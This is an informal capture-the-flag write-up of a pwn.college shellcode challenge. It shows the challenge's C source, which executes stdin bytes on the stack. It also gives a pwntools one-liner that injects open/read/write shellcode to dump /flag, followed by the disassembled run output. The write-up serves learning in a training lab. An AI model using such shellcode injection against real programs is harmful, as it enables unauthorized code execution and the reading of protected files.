# Basic shellcode


shellcodes are like glorified RCE exploits and they're for script kiddies that prefer injecting carefully precrafted payloads and then like getting a response
```bash
hacker@binary-exploitation~basic-shellcode:/challenge$ ls
DESCRIPTION.md  binary-exploitation-basic-shellcode  binary-exploitation-basic-shellcode.c
hacker@binary-exploitation~basic-shellcode:/challenge$
```

FINALLY A FUCKING C FILE I CAN SEE OH MY GOD BRO I WAS DYING OF LOOKING AT RAW ASSEMBLY

no offence terry davis i js aint the goat

anyways

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void *shellcode;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    puts("This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
    puts("as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
    puts("practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
    puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
    for (int i = 3; i < 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    puts("In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
    puts("execution, your shellcode will need to be *position-independent*.\n");
    uint8_t shellcode_buffer[0x1000];
    shellcode = (void *)&shellcode_buffer;
    printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", shellcode);

    puts("Reading 0x1000 bytes from stdin.\n");
    shellcode_size = read(0, shellcode, 0x1000);
    assert(shellcode_size > 0);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");
    ((void(*)())shellcode)();

    printf("### Goodbye!\n");
}
```

so they're hanging you a gun and tell you to shoot it at them, and then saying "good job!"


thats an interesting way of .... learning stuff

so i lifted someone else's shellcode off github and then got this


```
hacker@binary-exploitation~basic-shellcode:/challenge$ python3 -c "from pwn import *; context.arch='amd64'; io=process('./binary-exploitation-basic-shellcode'); io.send(asm(shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 128) + shellcraft.write(1, 'rsp', 128))); io.interactive()"
[+] Starting local process './binary-exploitation-basic-shellcode': pid 206
[*] Switching to interactive mode
###
### Welcome to ./binary-exploitation-basic-shellcode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7fffd1543f00!
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007fffd1543f00 | 48 b8 01 01 01 01 01 01 01 01                 | movabs rax, 0x101010101010101
0x00007fffd1543f0a | 50                                            | push rax
0x00007fffd1543f0b | 48 b8 2e 67 6d 60 66 01 01 01                 | movabs rax, 0x1010166606d672e
0x00007fffd1543f15 | 48 31 04 24                                   | xor qword ptr [rsp], rax
0x00007fffd1543f19 | 48 89 e7                                      | mov rdi, rsp
0x00007fffd1543f1c | 31 d2                                         | xor edx, edx
0x00007fffd1543f1e | 31 f6                                         | xor esi, esi
0x00007fffd1543f20 | 6a 02                                         | push 2
0x00007fffd1543f22 | 58                                            | pop rax
0x00007fffd1543f23 | 0f 05                                         | syscall
0x00007fffd1543f25 | 48 89 c7                                      | mov rdi, rax
0x00007fffd1543f28 | 31 c0                                         | xor eax, eax
0x00007fffd1543f2a | 31 d2                                         | xor edx, edx
0x00007fffd1543f2c | b2 80                                         | mov dl, 0x80
0x00007fffd1543f2e | 48 89 e6                                      | mov rsi, rsp
0x00007fffd1543f31 | 0f 05                                         | syscall
0x00007fffd1543f33 | 6a 01                                         | push 1
0x00007fffd1543f35 | 5f                                            | pop rdi
0x00007fffd1543f36 | 31 d2                                         | xor edx, edx
0x00007fffd1543f38 | b2 80                                         | mov dl, 0x80
0x00007fffd1543f3a | 48 89 e6                                      | mov rsi, rsp
0x00007fffd1543f3d | 6a 01                                         | push 1
0x00007fffd1543f3f | 58                                            | pop rax
0x00007fffd1543f40 | 0f 05                                         | syscall

Executing shellcode!

pwn.college{gXlIgthubvMhCreh42YmExndEE-.ddTMywSO2EzNwIzW}

```

thank you cryptonite
